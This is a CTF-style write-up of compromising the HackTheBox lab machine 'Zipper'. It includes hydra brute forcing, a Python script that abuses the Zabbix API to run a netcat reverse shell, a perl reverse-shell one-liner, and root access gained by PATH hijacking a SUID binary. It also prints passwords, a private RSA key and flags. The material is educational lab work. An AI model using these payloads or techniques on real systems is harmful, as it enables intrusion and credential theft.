# HTB - Zipper

## HackTheBox - Zipper

Zipper was one of the first HTB Machines I ever attempted. It is/was a fun machine that challenges you to get a stable shell since there is a proxy service in use. Initially, it was hard to find the right machine. Once there was a steady foothold on the right machine, getting user and root access was straightforward. Both methods of getting access are recurring themes in the Hack the Box machines: unsafe, lazely stored user credentials and exploiting an SUID executable. Nonetheless, it was very educational to go through the whole process.

### Service Enumeration

#### nmap

`nmap -sC -sV -oA nmap/zipper 10.10.10.108`

```bash
 Nmap scan report for 10.10.10.108
 Host is up (0.034s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
 |   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)
 |   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)
 |_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Apache2 Ubuntu Default Page: It works
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at 
 https://nmap.org/submit/ .
 Nmap done at Sun Oct 21 11:57:58 2018 -- 1 IP address (1 host up) scanned in 15.83 seconds
```

Since port 80 is open we will start directory browsing with `gobuster` to scan for directories.

#### gobuster

`gobuster -u http://10.10.10.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt`

```bash
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.108/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/10/21 11:58:56 Starting gobuster
=====================================================
[...]
/zabbix (Status: 301)
```

Now lets see what is at `http://10.10.10.108/zabbix`.

![](../.gitbook/assets/zipper-1.png)

### Gaining access to Zabbix

After some enumeration, a potential username was found, `zapper`. While running `hydra` and a custom wordlist on the variation of the word `zapper` I got a non-GUI acess message. Sounds like we have the right credentials but this user is only allowed API access.

```bash
hydra -l zapper -P /root/infosec-toolbox/SecLists/Passwords/probable-v2-top12000.txt 10.10.10.108 http-post-form "/zabbix/index.php/:name=^USER^&password=^PASS^&autologin=1&enter=Sign+in:Login name or password is incorrect."
```

username: `zapper` password: `zapper` `GUI access disabled`

With the following Python script I was able to get a login token, iterate through the hosts and create and execute scripts. The `Admin` credentials were obtained by using the `zapper`,`zapper` credentials, getting a reverse shell and then running `cat` on the `zabbix` configuration file:

```php
<?php
// Zabbix GUI configuration file.
global$DB;

$DB['TYPE']     ='MYSQL';
$DB['SERVER']   ='localhost';
$DB['PORT']     ='0';
$DB['DATABASE'] ='zabbixdb';
$DB['USER']     ='zabbix';
$DB['PASSWORD'] ='f.YMeMd$pTbpY3-449';

// Schema name. Used for IBM DB2 and PostgreSQL.
$DB['SCHEMA'] ='';$ZBX_SERVER='localhost';

$ZBX_SERVER_PORT='10051';
$ZBX_SERVER_NAME='Zabbix';

$IMAGE_FORMAT_DEFAULT=IMAGE_FORMAT_PNG;
?>
```

#### Python Reverse Shell

Using these credentials in the Python script:

```python
import urllib.request
import json
import random

IP = '10.10.X.X'
PORT = 9005
HOST_ID = 10106
PAYLOAD = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + IP + " " + str(PORT) + " >/tmp/f &"
# PAYLOAD = "su zapper -p zapper && cat /home/zapper/user.txt"
# PAYLOAD = "hostname && ls -la /home/zapper && ls -la /backups"

class Zabbix():
    URL = 'http://10.10.10.108/zabbix/api_jsonrpc.php'
    login_json = {
        "jsonrpc": "2.0",
        "method": "user.login",
        "params": {
            "user": "Admin",
            "password": "f.YMeMd$pTbpY3-449"
        },
        "id": 1
    }

    def __init__(self):
        self.host_id = HOST_ID
        self.auth = self.make_request(self.login_json)['result']

        self.hosts = {
            "jsonrpc": "2.0",
                "method": "host.get",
                "params": {
                    "output": [
                        "hostid",
                        "host"
                    ],
                    "selectinterfaces": [
                        "interfaceid",
                        "ip"
                    ]
                },
                "auth": self.auth,
                "id": 1
        }
        res_hosts = self.make_request(self.hosts)
        print(res_hosts)

        self.payload = {
            "jsonrpc": "2.0",
            "method": "script.create",
            "params": {
                "name": "RevShell-" + str(random.randint(0,100)),
                "command": PAYLOAD,
                "host_access": 10000,
                "execute_on": 0,
                "confirmation": "Are you sure you would like to exploit the server?"
            },
            "auth": self.auth,
            "id": 1
        }

        res = self.make_request(self.payload)
        self.script_id = res['result']['scriptids'][0]

        print("### RUNNING SCRIPT ###")
        self.run_script = {
            "jsonrpc": "2.0",
            "method": "script.execute",
            "params": {
                "scriptid": str(self.script_id),
                "hostid": int(self.host_id)
            },
            "auth": self.auth,
            "id": 1
        }
        res = self.make_request(self.run_script)
        print(res)

    def make_request(self, j):
        req = urllib.request.Request(self.URL)
        req.add_header('Content-Type', 'application/json; charset=utf-8')
        jsondata = json.dumps(j)
        jsondata = jsondata.encode('utf-8')
        req.add_header('Content-Length', len(jsondata))
        response = urllib.request.urlopen(req, jsondata)
        return json.loads(response.read())

if __name__ == '__main__':
    z = Zabbix()
```

With our netcat listener on port 9005, `nc -lvnp 9005` I got the reverse shell on the `zipper` machine

```bash
$ hostname
zipper
```

The only problem is that this shell is short lived because there is a proxy going through the **Zabbix** service.

### Penetration

#### User Access

**Stablizing the Reverse Shell**

To solve the unstable shell I started another shell by passing another `perl` reverse shell.

```bash
perl-e 'use Socket;$i="10.10.X.X";$p=9006;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

However, this is still just a raw TCP connection and I need to elevate to a TTY shel.

**Obtaining TTY Shell**

To elevate the raw TCP socket I referenced this site [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). `python3 -c 'import pty; pty.spawn("/bin/sh")'` With this elevated shell I able to access commands like `su` and `ssh`.

**Unsafely Stored Login Credentials for User**

Enumerating the home directory yields only one user:

```bash
drwxr-xr-x  6 zapper zapper 4096 Sep  9 19:12 zapper
```

Using the previously obtained passwords for the `zapper` user but this does not work. Continuing to enumerate I locate a bash script, `backup.sh` and looking inside:

```bash
#!/bin/bash
#
# Quick script to backup all utilities in this folder to /backups
#
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah
/home/zapper/utils/* &>/dev/null
echo$?
```

Inside the script we see another password, `ZippityDoDah` and this gives me access to the `zapper` user.

```bash
su zapper
Password: ZippityDoDah
```

Exploring the home directory there is a private key stored in `~/.shh`.

```bash
zapper@zipper:~/.ssh$ cat id_rsa
```

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAzU9krR2wCgTrEOJY+dqbPKlfgTDDlAeJo65Qfn+39Ep0zLpR
l3C9cWG9WwbBlBInQM9beD3HlwLvhm9kL5s55PIt/fZnyHjYYkmpVKBnAUnPYh67
GtTbPQUmU3Lukt5KV3nf18iZvQe0v/YKRA6Fx8+Gcs/dgYBmnV13DV8uSTqDA3T+
eBy7hzXoxW1sInXFgKizCEXbe83vPIUa12o0F5aZnfqM53MEMcQxliTiG2F5Gx9M
2dgERDs5ogKGBv4PkgMYDPzXRoHnktSaGVsdhYNSxjNbqE/PZFOYBq7wYIlv/QPi
eBTz7Qh0NNR1JCAvM9MuqGURGJJzwdaO4IJJWQIDAQABAoIBAQDIu7MnPzt60Ewz
+docj4vvx3nFCjRuauA71JaG18C3bIS+FfzoICZY0MMeWICzkPwn9ZTs/xpBn3Eo
84f0s8PrAI3PHDdkXiLSFksknp+XNt84g+tT1IF2K67JMDnqBsSQumwMwejuVLZ4
aMqot7o9Hb3KS0m68BtkCJn5zPGoTXizTuhA8Mm35TovXC+djYwgDsCPD9fHsajh
UKmIIhpmmCbHHKmMtSy+P9jk1RYbpJTBIi34GyLruXHhl8EehJuBpATZH34KBIKa
8QBB1nGO+J4lJKeZuW3vOI7+nK3RqRrdo+jCZ6B3mF9a037jacHxHZasaK3eYmgP
rTkd2quxAoGBAOat8gnWc8RPVHsrx5uO1bgVukwA4UOgRXAyDnzOrDCkcZ96aReV
UIq7XkWbjgt7VjJIIbaPeS6wmRRj2lSMBwf1DqZIHDyFlDbrGqZkcRv76/q15Tt0
oTn4x8SRZ8wdTeSeNRE3c5aFgz+r6cklNwKzMNuiUzcOoR8NSVOJPqJzAoGBAOPY
ks9+AJAjUTUCUF5KF4UTwl9NhBzGCHAiegagc5iAgqcCM7oZAfKBS3oD9lAwnRX+
zH84g+XuCVxJCJaE7iLeJLJ4vg6P43Wv+WJEnuGylvzquPzoAflYyl3rx0qwCSNe
8MyoGxzgSRrTFtYodXtXY5FTY3UrnRXLr+Q3TZYDAoGBALU/NO5/3mP/RMymYGac
OtYx1DfFdTkyY3y9B98OcAKkIlaA0rPh8O+gOnkMuPXSia5mOH79ieSigxSfRDur
7hZVeJY0EGOJPSRNY5obTzgCn65UXvFxOQCYtTWAXgLlf39Cw0VswVgiPTa4967A
m9F2Q8w+ZY3b48LHKLcHHfx7AoGATOqTxRAYSJBjna2GTA5fGkGtYFbevofr2U8K
Oqp324emk5Keu7gtfBxBypMD19ZRcVdu2ZPOkxRkfI77IzUE3yh24vj30BqrAtPB
MHdR24daiU8D2/zGjdJ3nnU19fSvYQ1v5ObrIDhm9XNFRk6qOlUp+6lW7fsnMHBu
lHBG9NkCgYEAhqEr2L1YpAW3ol8uz1tEgPdhAjsN4rY2xPAuSXGXXIRS6PCY8zDk
WaPGjnJjg9NfK2zYJqI2FN+8Yyfe62G87XcY7ph8kpe0d6HdVcMFE4IJ8iKCemNE
Yh/DOMIBUavqTcX/RVve0rEkS8pErQqYgHLHqcsRUGJlJ6FSyUPwjnQ=
-----END RSA PRIVATE KEY-----
```

Now that I am the user I can grab the `user.txt` flag.

> Milestone: user.txt flag: aa29e93f48c64f8586448b6f6e38fe33
>
> #### Root Access
>
> **Finding a SUID Executable**
>
> One of the recurring themes in **HackTheBox** is the use of exploiting SUID executables. SUID is short for Set User ID and is a permission type that is given a file that allows users to execute the file with the permissions of it's owner. To find SUID files owned by root: `find / -uid 0 -perm -4000 -type f 2>/dev/null` Doing this I found some files in the `utils` folder:
>
> ```bash
> zapper@zipper:~$ ls -la utils/
> total 20
> drwxrwxr-x 2 zapper zapper 4096 Sep  8 13:27 .
> drwxr-xr-x 6 zapper zapper 4096 Sep  9 19:12 ..
> -rwxr-xr-x 1 zapper zapper  194 Sep  8 13:12 backup.sh
> -rwsr-sr-x 1 root   root   7556 Sep  8 13:05 zabbix-service
> ```
>
> Notice the `-rw`**s**`r-sr-x` in the permissions for `zabbix-service`. This lets me know that it can be executed with the `root` privileges. Looking into the binary:
>
> ```bash
> zapper@zipper:~$ strings utils/zabbix-service
> tdx
> /lib/ld-linux.so.2
> libc.so.6
> _IO_stdin_used
> setuid
> puts
> stdin
> printf
> fgets
> strcspn
> system
> __cxa_finalize
> setgid
> strcmp
> __libc_start_main
> __stack_chk_fail
> GLIBC_2.1.3
> GLIBC_2.4
> GLIBC_2.0
> _ITM_deregisterTMCloneTable
> __gmon_start___
> ITM_registerTMCloneTable
> Y[^]
> UWVS
> [^_]
> start or stop?:
> start
> systemctl daemon-reload && systemctl start zabbix-agent
> stop
> systemctl stop zabbix-agent
> [!] ERROR: Unrecognized Option
> ;*2$"
> GCC: (Ubuntu 7.3.0-16ubuntu3) 7.3.0
> ```
>
> I see that this script is using **systemctl** _daemon-reload && systemctl start zabbix-agent_
>
> **PrivEsc using PATH Environment Variable**
>
> I can make a change to the `PATH` envronment variable to create my own version of `systemctl`: `vim /tmp/systemctl` With the contents: `/bin/sh -c 'cat /root/root.txt` The fake `systemctl` will need to be executable and the location, `/tmp` added as the first entry to the `PATH` environment variable.
>
> ```text
> chmod +x /tmp/systemctl
> export PATH=/tmp:$PATH
> ```
>
> Now it's time to run the SUID executable, `zabbix-service` that will use our fake `systemctl` which will `cat /root/root.txt`. Of course we could have added another backdoor to get a `root` shell.
>
> ```bash
> zapper@zipper:/tmp$ ../home/zapper/utils/zabbix-service
> start or stop?: start
> a7c743d35b8efbedfd9336492a8eab6e
> ```
>
> Milestone: root.txt flag: a7c743d35b8efbedfd9336492a8eab6e For complete `root` access I just overwrote the fake `systemctl` with a simple bash script
>
> ```bash
> /bin/sh -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.X.X 9000 >/tmp/f'
> ```

